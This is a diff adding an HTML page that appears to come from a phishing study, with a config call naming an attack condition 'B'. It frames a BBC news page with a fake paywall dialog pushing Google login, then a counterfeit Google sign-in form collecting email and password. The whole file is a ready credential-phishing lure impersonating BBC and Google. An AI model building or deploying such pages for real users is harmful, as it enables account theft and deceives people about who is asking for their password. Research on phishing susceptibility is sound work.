@@ -1,0 +1,168 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>BBC - Homepage</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <script type="module">
+      import { setAttackConfig } from "./src/config.ts";
+      setAttackConfig({ useFullscreen: false, conditionName: "B" });
+    </script>
+    <script type="module" src="./src/main.ts"></script>
+  </head>
+  <body>
+    <div id="page-root" class="page-root">
+      <iframe
+        id="news-frame"
+        class="news-frame"
+        src="./BBC.html"
+        title="BBC News homepage"
+        loading="lazy"
+      ></iframe>
+
+      <div
+        id="paywall-overlay"
+        class="paywall-overlay hidden"
+        hidden
+        role="dialog"
+        aria-modal="true"
+        aria-labelledby="paywall-title"
+        aria-describedby="paywall-desc"
+      >
+        <div class="paywall-card">
+          <div class="paywall-brand" aria-hidden="true">
+            <span>B</span><span>B</span><span>C</span>
+          </div>
+
+          <p class="paywall-eyebrow">Breaking news, live and on-demand</p>
+          <h2 id="paywall-title">Want to view this page?</h2>
+          <p class="paywall-copy" id="paywall-desc">
+            Log in with your Google Account to keep reading the latest BBC stories
+            without interruptions or paywalls.
+          </p>
+
+          <ul class="paywall-benefits">
+            <li>Unlimited access to top stories and live coverage</li>
+            <li>Personalised updates across all your devices</li>
+            <li>100% free – no credit card required</li>
+          </ul>
+
+          <div class="paywall-actions">
+            <button id="paywall-dismiss" class="paywall-secondary">
+              Maybe later
+            </button>
+            <button id="paywall-continue" class="paywall-primary">
+              Login to view for free
+            </button>
+          </div>
+
+          <div class="paywall-seal">
+            <span class="paywall-lock" aria-hidden="true"></span>
+            Secure sign-in with Google
+          </div>
+
+          <p class="paywall-note">
+            By continuing, you agree to BBC Terms of Use and Privacy Policy.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div id="fake-google-root" class="fake-root hidden" hidden>
+      <div class="fake-bg">
+        <div class="fake-card">
+          <div class="fake-layout">
+            <div class="fake-info">
+              <div class="fake-logo-circle" aria-hidden="true">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="48"
+                  height="48"
+                  viewBox="0 0 48 48"
+                  role="img"
+                  aria-labelledby="fake-google-logo"
+                >
+                  <title id="fake-google-logo">Google logo</title>
+                  <path
+                    fill="#4285f4"
+                    d="M43.6 20.5H24v7h11.3c-.5 3-2.1 5.3-4.4 6.9v5.7h7.1C41.5 35.6 44 30 44 24c0-1.2-.1-2.4-.4-3.5z"
+                  />
+                  <path
+                    fill="#34a853"
+                    d="M24 44c6 0 11-2 14.7-5.5l-7.1-5.7c-2 1.4-4.6 2.2-7.6 2.2-5.8 0-10.7-3.9-12.4-9.2H4.2v5.8C7.9 39.3 15.3 44 24 44z"
+                  />
+                  <path
+                    fill="#fbbc05"
+                    d="M11.6 26.3c-.4-1.2-.6-2.5-.6-3.8s.2-2.6.6-3.8v-5.8H4.2C2.8 14.8 2 19.3 2 22.5s.8 7.7 2.2 11.2l7.4-5.8z"
+                  />
+                  <path
+                    fill="#ea4335"
+                    d="M24 9.5c3.2 0 6 1.1 8.3 3.2l6.2-6.2C35 2.7 29.9 1 24 1 15.3 1 7.9 5.7 4.2 14.2l7.4 5.8C13.3 13.4 18.2 9.5 24 9.5z"
+                  />
+                </svg>
+              </div>
+
+              <h1 class="fake-title">Sign in</h1>
+              <p class="fake-subtitle">Use your Google Account</p>
+            </div>
+
+            <div class="fake-form-wrapper">
+              <form id="fake-login-form" class="fake-form">
+                <label class="fake-label">
+                  <input
+                    id="fake-email"
+                    type="email"
+                    class="fake-input"
+                    placeholder="Email or phone"
+                    autocomplete="off"
+                  />
+                </label>
+
+                <button type="button" class="fake-link-btn">
+                  Forgot email?
+                </button>
+
+                <label class="fake-label">
+                  <input
+                    id="fake-password"
+                    type="password"
+                    class="fake-input"
+                    placeholder="Enter your password"
+                    autocomplete="off"
+                  />
+                </label>
+
+                <p class="fake-info-note">
+                  Not your computer? Use Guest mode
+                  <button type="button" class="fake-link-btn fake-inline-link">
+                    Learn more
+                  </button>
+                </p>
+
+                <div class="fake-form-footer">
+                  <button type="button" class="fake-link-btn">
+                    Create account
+                  </button>
+                  <button type="submit" class="primary-btn fake-submit">
+                    Next
+                  </button>
+                </div>
+              </form>
+            </div>
+          </div>
+
+          <div class="fake-bottom-bar">
+            <button type="button" class="fake-link-btn language-btn">
+              English (United States)
+            </button>
+            <div class="fake-bottom-links">
+              <button type="button" class="fake-link-btn">Help</button>
+              <button type="button" class="fake-link-btn">Privacy</button>
+              <button type="button" class="fake-link-btn">Terms</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
